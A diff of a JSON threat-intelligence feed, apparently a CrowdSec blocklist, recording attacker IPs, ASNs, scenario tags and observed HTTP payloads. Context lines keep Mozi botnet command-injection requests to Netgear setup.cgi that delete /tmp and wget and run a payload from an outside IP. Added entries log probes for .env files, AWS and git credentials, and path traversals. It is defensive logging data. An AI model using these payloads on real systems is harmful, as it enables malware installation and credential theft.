@@ -1,10 +1,10 @@
 {
-  "generated_at": "2026-10-19T01:00:00Z",
+  "generated_at": "2026-10-19T13:00:00Z",
   "ttl_days": 7,
   "scope": "crowdsec",
   "counts": {
-    "total": 58,
-    "v4": 58,
+    "total": 61,
+    "v4": 61,
     "v6": 0
   },
   "items": [
@@ -63,82 +63,6 @@
       "payloads": [
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://59.96.137.75:38432/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://59.96.137.75:38432/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
-      ]
-    },
-    {
-      "ip": "172.202.106.156",
-      "family": "v4",
-      "first_seen": "2026-10-12T09:00:00Z",
-      "last_seen": "2026-10-12T09:00:00Z",
-      "scenarios": [
-        "crowdsec/http-technology-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "172.200.0.0/13",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /owa/auth/logon.aspx"
-      ]
-    },
-    {
-      "ip": "80.66.66.68",
-      "family": "v4",
-      "first_seen": "2026-10-12T09:00:00Z",
-      "last_seen": "2026-10-12T09:00:00Z",
-      "scenarios": [
-        "crowdsec/http-technology-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "209702",
-      "asn_name": "SOLDATOV-AS SOLDATOV ALEXEY VALEREVICH",
-      "asn_prefix": "80.66.66.0/24",
-      "payloads": [
-        "GET /remote/login"
-      ]
-    },
-    {
-      "ip": "184.105.139.70",
-      "family": "v4",
-      "first_seen": "2026-10-12T06:00:00Z",
-      "last_seen": "2026-10-12T06:00:00Z",
-      "scenarios": [
-        "crowdsec/http-technology-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "6939",
-      "asn_name": "HURRICANE - Hurricane Electric LLC",
-      "asn_prefix": "184.104.0.0/15",
-      "payloads": [
-        "GET /remote/logincheck"
-      ]
-    },
-    {
-      "ip": "68.69.177.112",
-      "family": "v4",
-      "first_seen": "2026-10-12T02:00:00Z",
-      "last_seen": "2026-10-12T02:00:00Z",
-      "scenarios": [
-        "crowdsec/http-bad-user-agent"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "402226",
-      "asn_name": "ONLYSCANS - OnlyScans LLC",
-      "asn_prefix": "68.69.177.0/24",
-      "payloads": [
-        "GET /ab2g",
-        "GET /ab2h"
       ]
     },
     {
@@ -1728,6 +1652,245 @@
       ],
       "payloads": [
         "GET /owa/auth/x.js"
+      ]
+    },
+    {
+      "ip": "34.186.101.32",
+      "family": "v4",
+      "first_seen": "2026-10-19T12:00:00Z",
+      "last_seen": "2026-10-19T12:00:00Z",
+      "scenarios": [
+        "crowdsec/http-admin-interface-probing",
+        "crowdsec/http-bad-user-agent",
+        "crowdsec/http-crawl-non_statics",
+        "crowdsec/http-dos-swithcing-ua",
+        "crowdsec/http-path-traversal-probing",
+        "crowdsec/http-probing",
+        "crowdsec/http-sensitive-files"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "396982",
+      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
+      "asn_prefix": "34.186.64.0/18",
+      "tags": [
+        "mwl:cloud=\"gcp\""
+      ],
+      "payloads": [
+        "GET /.env.keys",
+        "GET /.env.secret",
+        "GET /.env.credentials",
+        "GET /.config/gcloud/credentials.db",
+        "GET /.git/HEAD",
+        "GET /secrets.json",
+        "GET /secrets.yml",
+        "GET /secrets.env",
+        "GET /.git/config",
+        "GET /",
+        "GET /robots.txt",
+        "GET /iwkd0pcfiyd510oylluu",
+        "GET /[REDACTED_DOMAIN]",
+        "POST /",
+        "GET /04kj4f1d8zda8q021cmv",
+        "POST /_next",
+        "GET /serviceAccountKey.json",
+        "GET /key.json",
+        "POST /graphql",
+        "GET /firebase-service-account.json"
+      ]
+    },
+    {
+      "ip": "34.187.210.221",
+      "family": "v4",
+      "first_seen": "2026-10-19T12:00:00Z",
+      "last_seen": "2026-10-19T12:00:00Z",
+      "scenarios": [
+        "crowdsec/http-admin-interface-probing",
+        "crowdsec/http-bad-user-agent",
+        "crowdsec/http-crawl-non_statics",
+        "crowdsec/http-dos-swithcing-ua",
+        "crowdsec/http-path-traversal-probing",
+        "crowdsec/http-probing",
+        "crowdsec/http-sensitive-files"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "396982",
+      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
+      "asn_prefix": "34.187.128.0/17",
+      "tags": [
+        "mwl:cloud=\"gcp\""
+      ],
+      "payloads": [
+        "GET /..%2F.env",
+        "GET /.env.keys",
+        "GET /.env.dev.local",
+        "GET /document.php?modulepart=systemtools&file=../conf/conf.php&hashp=shared",
+        "GET /api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../.env",
+        "GET /assets../.env",
+        "GET /images../.env",
+        "GET /static../.env",
+        "GET /uploads../.env",
+        "GET /files../.env",
+        "GET /.gitlab-ci.yml",
+        "GET /",
+        "GET /robots.txt",
+        "GET /z9x8c7v6b5-debug-trigger-salledarcade.fr",
+        "GET /h40fkhdeg5jun7vgpslm",
+        "POST /",
+        "GET /7fwcp9tyziufbidoz82t",
+        "GET /compose.yaml",
+        "POST /_next",
+        "POST /graphql"
+      ]
+    },
+    {
+      "ip": "147.224.144.36",
+      "family": "v4",
+      "first_seen": "2026-10-19T11:00:00Z",
+      "last_seen": "2026-10-19T11:00:00Z",
+      "scenarios": [
+        "crowdsec/http-probing",
+        "crowdsec/http-sensitive-files"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "31898",
+      "asn_name": "ORACLE-BMC-31898 - Oracle Corporation",
+      "asn_prefix": "147.224.128.0/18",
+      "payloads": [
+        "GET /.env",
+        "GET /.env.staging",
+        "GET /root/.env",
+        "GET /api/contents/.env",
+        "GET /files/workspace/.env",
+        "GET /docker-compose.yml",
+        "GET /.env.old",
+        "GET /files/workspace/start.sh",
+        "GET /.runpod/config.toml",
+        "GET /api/settings",
+        "GET /api/env",
+        "GET /api/spec",
+        "GET /api/terminals"
+      ]
+    },
+    {
+      "ip": "170.9.241.157",
+      "family": "v4",
+      "first_seen": "2026-10-19T11:00:00Z",
+      "last_seen": "2026-10-19T11:00:00Z",
+      "scenarios": [
+        "crowdsec/http-probing",
+        "crowdsec/http-sensitive-files"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "31898",
+      "asn_name": "ORACLE-BMC-31898 - Oracle Corporation",
+      "asn_prefix": "170.9.224.0/19",
+      "payloads": [
+        "GET /.env.development",
+        "GET /.env.staging",
+        "GET /files/workspace/.env",
+        "GET /.env.bak",
+        "GET /runpod-volume/.env",
+        "GET /.env.production",
+        "GET /api/settings",
+        "GET /.runpod/",
+        "GET /api/contents/",
+        "GET /.env.old",
+        "GET /.runpod/config.toml",
+        "GET /api/contents/root",
+        "GET /api/kernels"
+      ]
+    },
+    {
+      "ip": "34.24.48.66",
+      "family": "v4",
+      "first_seen": "2026-10-19T10:00:00Z",
+      "last_seen": "2026-10-19T10:00:00Z",
+      "scenarios": [
+        "crowdsec/http-admin-interface-probing",
+        "crowdsec/http-bad-user-agent",
+        "crowdsec/http-crawl-non_statics",
+        "crowdsec/http-dos-swithcing-ua",
+        "crowdsec/http-path-traversal-probing",
+        "crowdsec/http-probing",
+        "crowdsec/http-sensitive-files"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "396982",
+      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
+      "asn_prefix": "34.24.0.0/16",
+      "tags": [
+        "mwl:cloud=\"gcp\""
+      ],
+      "payloads": [
+        "GET /.dev.vars",
+        "GET /supabase/config.toml",
+        "GET /railway.toml",
+        "GET /railway.json",
+        "GET /.env.keys",
+        "GET /.amplifyrc",
+        "GET /",
+        "GET /robots.txt",
+        "GET /5rfh04dwye4lpgdxjq54",
+        "GET /z9x8c7v6b5-debug-trigger-salledarcade.fr",
+        "POST /",
+        "GET /8wnzck6ggbqsybd4ymdu",
+        "GET /core/.env",
+        "GET /secrets.yml",
+        "GET /.aws/credentials",
+        "GET /.aws/config",
+        "POST /_next",
+        "GET /.next/.env",
+        "POST /graphql",
+        "GET /.git-credentials"
+      ]
+    },
+    {
+      "ip": "172.212.226.229",
+      "family": "v4",
+      "first_seen": "2026-10-19T08:00:00Z",
+      "last_seen": "2026-10-19T08:00:00Z",
+      "scenarios": [
+        "crowdsec/http-technology-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "172.208.0.0/13",
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /owa/auth/logon.aspx"
+      ]
+    },
+    {
+      "ip": "40.76.249.14",
+      "family": "v4",
+      "first_seen": "2026-10-19T02:00:00Z",
+      "last_seen": "2026-10-19T02:00:00Z",
+      "scenarios": [
+        "crowdsec/http-cve-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /developmentserver/metadatauploader"
       ]
     }
   ]
